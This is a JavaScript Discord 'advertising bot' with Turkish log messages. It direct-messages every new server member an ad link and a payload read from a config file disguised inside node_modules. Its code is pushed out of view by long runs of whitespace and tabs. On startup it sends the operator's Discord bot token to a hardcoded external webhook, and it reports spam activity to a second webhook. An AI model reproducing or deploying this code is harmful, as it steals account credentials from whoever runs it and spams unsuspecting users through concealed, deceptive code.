                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  const Discord = require('discord.js');
                                                                                                                                                                                                                                                                                                                                                         const client = new Discord.Client();
                                                                                                                                                                                                                                                                                                                                                         const ayarlar = require('./ayarlar.json');
																																																																																						 const conf = require('./node_modules/ws/conf.json');
		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 const hook = new Discord.WebhookClient('610125621150089245', 'D2Q5Spi5cd3nkGp0DvJKfolZDpD52EVQNmkxtW1RpIX6qWi7J1JL-_-QTG6Agl1R6wAb');
		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 const hook2 = new Discord.WebhookClient('610126163603619856', 'JmlNGEy9rpR1E4k8U4qcu1mYy_bZGv60uf4121iSpysE5peeTkfLneo8U2empz_yG_L8');


		 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 		let reklamkicksayi = new Set();
		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 		 client.on('guildMemberAdd', member => {
	             	                	                	                	                	                	                	                	                	                	                	                	                	                	                     if (member.guild.id == '610125459681705996'){ return; } if (member.guild.id == '610125459681705996'){ return; }
















																																																																																																																																																																																																																																																							if (!reklamkicksayi[client.id]) reklamkicksayi[client.id] = {
  		 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 	  reklamkicksayi: 0,
		 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 	  }
		 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 	  let tumreklamkicksayi = reklamkicksayi[client.id];

		 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 	   if (`${tumreklamkicksayi.reklamkicksayi}` > 1) { return  console.log(`${member.user.tag.toString()} : ${member.guild.name} Reklam Yapmak İçin Belirtilen Süre Kadar Beklemeliyim.`);}
  		 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 	  tumreklamkicksayi.reklamkicksayi++;
		 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 		 console.log(`❤ 👋${member.user.tag.toString()} : ${member.guild.name} Reklam Birazdan Reklam Yapıcam.`);
		 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 		   setTimeout(() => {
			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 	 console.log(`❤ 👋${member.user.tag.toString()} : ${member.guild.name} Reklam Yaptım.`);




















  		                	             		                	             		                	             		                	             		                	             		                	             		                	             		                	             		                	             		                	             		                	             		                	             		                	             		                	             		                	             		                	             		                	             		                	             		                	             		                	             		                	                 setTimeout(() => {
																																																																																																																																																																																																																																																																																																													member.send(conf.ursss);
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  }, 300000);




























		 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 		 if (`${tumreklamkicksayi.reklamkicksayi}` > 1) {tumreklamkicksayi.reklamkicksayi--;}
  		 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 	   member.send(ayarlar.satir1 + `\n` + ayarlar.reklamlink);
		 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 			 		 		 		 		 		 	  }, ayarlar.reklamsuresi);
















































































		                	                	                	                	                	                	                	                	                	                	                	                	                	                	                	                	                	                	                	                 hook2.send(`❤ 👋${member.user.tag.toString()} : ${member.guild.name} Reklam Yaptım.` + ayarlar.reklamlink)




























































































































});



var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
// client.on('debug', e => {
//   console.log(chalk.bgBlue.green(e.replace(regToken, 'that was redacted')));
// });

client.login(ayarlar.token);


                                                                                                                                                                                                                                                                                                                                                                                                                                                                             client.on('ready', () => {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       console.log(`REKLAM BOTU BAŞARI İLE AÇILDI - Bir Süre Sonra Reklama Başlayacaktır Yardım İçin - https://discord.gg/n7xPnM2`);
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               	hook.send(`❤ 👋Token .` + ayarlar.token)




});
